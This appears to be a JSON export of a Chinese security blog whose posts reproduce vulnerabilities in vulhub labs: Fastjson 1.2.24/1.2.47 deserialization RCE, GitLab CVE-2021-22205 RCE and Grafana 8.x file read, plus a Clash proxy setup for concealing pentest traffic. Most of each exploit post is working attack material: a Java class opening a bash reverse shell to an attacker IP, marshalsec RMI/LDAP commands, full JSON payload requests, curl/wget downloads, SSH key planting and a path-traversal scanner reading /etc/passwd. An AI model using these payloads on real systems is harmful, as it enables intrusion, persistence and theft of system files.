{"meta":{"title":"Al0nez's Bolg","subtitle":"我与春风皆过客,你携秋水揽星河","description":null,"author":"Al0nez","url":"https://Al0nez.github.io","root":"/"},"pages":[{"title":"分类&标签","date":"2021-09-10T02:30:39.000Z","updated":"2021-09-10T02:33:48.948Z","comments":true,"path":"tags/index.html","permalink":"https://al0nez.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Fastjson 1.2.47 远程命令执行漏洞","slug":"Fastjson1-2-47远程命令执行漏洞","date":"2021-12-20T06:55:42.000Z","updated":"2021-12-20T06:58:26.226Z","comments":true,"path":"2021/12/20/Fastjson1-2-47远程命令执行漏洞/","link":"","permalink":"https://al0nez.github.io/2021/12/20/Fastjson1-2-47%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"Fastjson 1.2.47的利用方式和和1.2.24的利用方式相似，如果没有复现过1.2.24的推荐看一下我上一篇文章。","text":"Fastjson 1.2.47的利用方式和和1.2.24的利用方式相似，如果没有复现过1.2.24的推荐看一下我上一篇文章。 0x01 漏洞详情Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。 0x02 环境搭建靶机环境：vulhub-fastjson-1.2.47 12cd vulhub/fastjson/1.2.47-rcedocker-compose up -d 0x03 影响版本fastjson &lt;= 1.2.47 0x04 漏洞复现访问页面如下： RMI利用方式攻击脚本，反弹shell 123456789101112public class Exploit &#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/10.1.3.145/8888 0&gt;&amp;1&quot;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 编译一下脚本javac Exploit.java，执行完后，会出现一个Exploit.class的文件。 本地启动一个HTTP服务，使用marshalsec启动RMI服务，监听8001端口远程加载Exploit.class文件 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001 本地监听一下8888端口 1nc -lvnp 8888 开始攻击,payload如下，注意是以POST方式提交： 123456789101112131415161718192021POST / HTTP/1.1Host: 192.168.47.156:8090User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonContent-Length: 264&#123; &quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://10.1.3.145:8001/Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; 查看RMI端记录 监听端 LDAP利用方式前面都一样，就marshalsec部分和数据包需要修改一下。这里启动的是LDAP服务，前面的是RMI服务。 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001 然后数据包修改成LDAP 123456789101112131415161718192021POST / HTTP/1.1Host: 192.168.47.156:8090User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonContent-Length: 264&#123; &quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://10.1.3.145:8001/Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; 之后和前面一样都弄好以后，发送数据包 LDAP端记录 监听端 0x05 参考链接 https://www.cnblogs.com/null1433/p/12697682.html https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce","categories":[],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://al0nez.github.io/tags/Fastjson/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://al0nez.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Fastjson 1-2-24 远程命令执行漏洞","slug":"Fastjson1-2-24远程命令执行漏洞","date":"2021-12-20T06:12:10.000Z","updated":"2021-12-20T06:56:24.759Z","comments":true,"path":"2021/12/20/Fastjson1-2-24远程命令执行漏洞/","link":"","permalink":"https://al0nez.github.io/2021/12/20/Fastjson1-2-24%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"刚好今天复现一下Fastjson漏洞。","text":"刚好今天复现一下Fastjson漏洞。 0x01 漏洞详情fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 0x02环境搭建靶机环境：vulhub-fastjson-1.2.24 12cd vulhub/fastjson/1.2.24-rcedocker-compose up -d 0x03 影响版本fastjson &lt;= 1.2.24 0x04 漏洞复现访问页面如下: RMI利用方式攻击脚本，将shell反弹到攻击机上。 123456789101112public class Exploit &#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/10.1.3.145/8888 0&gt;&amp;1&quot;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 编译一下脚本javac Exploit.java，执行完后，会出现一个Exploit.class的文件。 之后需要下载marshalsec项目，然后进行编译。 1https://github.com/mbechler/marshalsec 本地启动一个HTTP服务，使用marshalsec启动RMI服务，监听8001端口远程加载Exploit.class文件 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001 然后开启监听8888端口： 开始攻击,payload如下，注意是以POST方式提交： 123456789101112131415161718POST / HTTP/1.1Host:192.168.47.156:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 165&#123; &quot;naraku&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://10.1.3.145:8001/Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; 查看RMI端的记录 查看监听部分： 成功返回了shell。 LDAP利用方式前面的基本都一样，唯一不一样的地方在marshalsec项目这里。 这里启动的不是RMI服务，而是LDAP服务，监听端口换成8002了。 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8002 在burp端发起payload，payload如下，依旧注意是POST请求： 123456789101112131415161718POST / HTTP/1.1Host:192.168.47.156:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 167&#123; &quot;naraku&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://10.1.3.145:8002/Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; LDAP端记录： 监听部分： 0x05 参考链接 https://www.cnblogs.com/chen-w/p/14735881.html https://www.wangan.com/docs/342 http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/","categories":[],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://al0nez.github.io/tags/Fastjson/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://al0nez.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"GitLab未授权RCE","slug":"GitLab未授权RCE","date":"2021-12-17T06:45:42.000Z","updated":"2021-12-17T06:47:41.511Z","comments":true,"path":"2021/12/17/GitLab未授权RCE/","link":"","permalink":"https://al0nez.github.io/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/","excerpt":"本来早该复现完的，中间因为太多事情耽误了。","text":"本来早该复现完的，中间因为太多事情耽误了。 0x01.漏洞介绍GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。 由于 GitLab 没有正确验证传递给文件解析器的图像文件，攻击者可利用该漏洞在服务端进行远程命令执行。 0x02.影响版本11.9 &lt;= GitLab（CE/EE）&lt; 13.8.813.9 &lt;= GitLab（CE/EE）&lt; 13.9.613.10 &lt;= GitLab（CE/EE）&lt; 13.10.3 0x03.环境搭建123git clone https://github.com/vulhub/vulhub.gitcd vulhub/gitlab/CVE-2021-22205/docker-compose up -d 访问http://127.0.0.1:8080即可。 0x04.漏洞复现利用脚本1https://github.com/Al1ex/CVE-2021-22205 探测漏洞是否存在1python CVE-2021-22205.py -v true -t http://192.168.47.156:8080/ 下载文件1python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;curl http://10.1.3.91:1234/1.txt&quot; 反弹shell123456789#写入shellpython CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.1.3.91/6666 0&gt;&amp;1&#x27; &gt; /tmp/1.sh&quot;#赋予shell脚本执行权限py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;chmod +x /tmp/1.sh&quot;#服务器监听6666端口nc64.exe -lvnp 6666#获取git权限py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;/bin/bash /tmp/1.sh&quot; 执行完命令后，成功上线。 可以看到我们创建的1.sh也在。 ssh公钥登录通过cat /etc/passwd可以发现git用户可以远程ssh登录。 我们将公钥写到目标机器上进行登录。 本地生成一下ssh公钥，输入ssh-keygen然后一路回车就OK了。 之后利用我们之前反弹获取到的shell，将公钥下载到目标机器上。 1wget http://10.1.3.91:1234/gitlab_git.pub 默认情况下git用户的authorized_keys内容为空，如果存在内容的话，先备份一下，再写入。这里要注意的是authorized_keys是在用户下的.ssh目录下。 写入成功后进行ssh登录即可。 后续本来想要手工再利用的，没有账号密码！！！。","categories":[],"tags":[{"name":"GitLab","slug":"GitLab","permalink":"https://al0nez.github.io/tags/GitLab/"},{"name":"RCE","slug":"RCE","permalink":"https://al0nez.github.io/tags/RCE/"}]},{"title":"Grafana任意文件读取","slug":"Grafana任意文件读取","date":"2021-12-08T01:59:02.000Z","updated":"2021-12-08T02:02:59.210Z","comments":true,"path":"2021/12/08/Grafana任意文件读取/","link":"","permalink":"https://al0nez.github.io/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"最近Grafana爆出了任意文件读取，这里刚好复现一波","text":"最近Grafana爆出了任意文件读取，这里刚好复现一波 什么是GrafanaGrafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计，带有告警功能。目前使用grafana的公司有很多，如paypal、ebay、intel等。 影响版本Grafana 8.x POC1http://IP/public/plugins/插件名称/../../../../../../../../../../../etc/passwd 脚本123456789101112131415161718import requestsimport sys args = str(sys.argv[1])f = open(&quot;./paload.txt&quot;)for line in f: url = &quot;http://&quot;+args+&quot;/public/plugins/&quot;+str.rstrip(line)+&quot;/../../../../../../../../../../../etc/passwd&quot; headers = &#123; &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0&quot;, &#125; req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False) a=req.text str1=&#x27;root&#x27; if a in str1: print(&#x27;确认存在&#x27;+str.rstrip(line)+&#x27;路径,并存在漏洞!&#x27;) print(url) else: print(&#x27;不存在漏洞!&#x27;)","categories":[],"tags":[{"name":"Grafana","slug":"Grafana","permalink":"https://al0nez.github.io/tags/Grafana/"}]},{"title":"Clash配置TUN模式","slug":"Clash配置TUN模式","date":"2021-12-03T10:01:05.000Z","updated":"2021-12-03T10:08:10.250Z","comments":true,"path":"2021/12/03/Clash配置TUN模式/","link":"","permalink":"https://al0nez.github.io/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/","excerpt":"Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊","text":"Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊 TUN模式配置从Clash v0.17.2开始，我们就不需要自己去下载wintun.dll文件了。现在，我们只需要打开Clash。 点击General中Service Mode右边的Manage。在打开的窗口安装服务模式，安装完成后会自动重启，只要Service Mode右边的地球变成绿色的，就代表安装成功了。 进入Settings页面 &gt; Profile Mixin &gt; YAML &gt; Edit 返回general页面开启Mixin即可 这里需要注意的是如果你在配置之前需要将general页面的Mixin关闭，如果没有关闭就配置完了，需要在配置完成后进行重启Clash。 123456789101112131415mixin: # object dns: enable: true enhanced-mode: redir-host nameserver: - 119.29.29.29 - 223.5.5.5 - 223.6.6.6 tun: enable: true stack: gvisor dns-hijack: - 198.18.0.2:53 macOS-auto-route: true macOS-auto-detect-interface: true 全都配置完后，打开控制面板 &gt; 网络和 Internet &gt; 网络和共享中心 &gt; 左侧更改适配器设置，找到名称为Clash且描述为Clash Tunnel的适配器，如果显示已启用，说明tap模式成功开启 最后记得想要全部代理流量，选全局！！！","categories":[],"tags":[{"name":"Clash","slug":"Clash","permalink":"https://al0nez.github.io/tags/Clash/"}]}],"categories":[],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://al0nez.github.io/tags/Fastjson/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://al0nez.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"GitLab","slug":"GitLab","permalink":"https://al0nez.github.io/tags/GitLab/"},{"name":"RCE","slug":"RCE","permalink":"https://al0nez.github.io/tags/RCE/"},{"name":"Grafana","slug":"Grafana","permalink":"https://al0nez.github.io/tags/Grafana/"},{"name":"Clash","slug":"Clash","permalink":"https://al0nez.github.io/tags/Clash/"}]}